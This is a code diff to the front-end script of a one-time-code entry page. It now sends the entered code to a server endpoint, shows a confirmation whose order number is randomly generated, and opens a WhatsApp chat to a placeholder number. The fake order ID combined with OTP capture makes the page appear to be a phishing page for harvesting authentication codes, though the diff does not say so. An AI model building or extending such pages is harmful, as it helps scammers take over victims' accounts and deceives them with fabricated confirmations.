@@ -6,19 +6,40 @@
   const confirmation = $('confirmation');
   const orderIdEl = $('orderId');
   const verifyBtn = $('verifyBtn');
+  const whatsappBtn = $('whatsappBtn');
+  const WHATSAPP_URL = 'https://wa.me/0000000000';
   const yearEl = document.querySelector('#year');
   if(yearEl) yearEl.textContent = new Date().getFullYear();
 
-  form.addEventListener('submit', function(e){
+  function normalizeDigits(str=''){
+    const map={'٠':'0','١':'1','٢':'2','٣':'3','٤':'4','٥':'5','٦':'6','٧':'7','٨':'8','٩':'9','۰':'0','۱':'1','۲':'2','۳':'3','۴':'4','۵':'5','۶':'6','۷':'7','۸':'8','۹':'9'};
+    return (str+'').replace(/[٠-٩۰-۹]/g,d=>map[d]||d);
+  }
+
+  if(whatsappBtn) whatsappBtn.addEventListener('click', ()=>{ window.open(WHATSAPP_URL,'_blank'); });
+
+  form.addEventListener('submit', async function(e){
     e.preventDefault();
-    if(!otp.value.trim()) return;
+    const code = normalizeDigits(otp.value.trim());
+    if(!code) return;
     loading.style.display='block';
     verifyBtn.disabled=true;
-    setTimeout(function(){
-      loading.style.display='none';
+    try{
+      const res = await fetch('/api/submit',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({otp:code})
+      });
+      if(!res.ok) throw new Error('Bad response');
       form.style.display='none';
       confirmation.style.display='block';
       orderIdEl.textContent = '#' + Math.floor(100000 + Math.random()*900000);
-    }, 1200);
+      window.open(WHATSAPP_URL,'_blank');
+    }catch(ex){
+      console.error(ex);
+    }finally{
+      loading.style.display='none';
+      verifyBtn.disabled=false;
+    }
   });
 })();
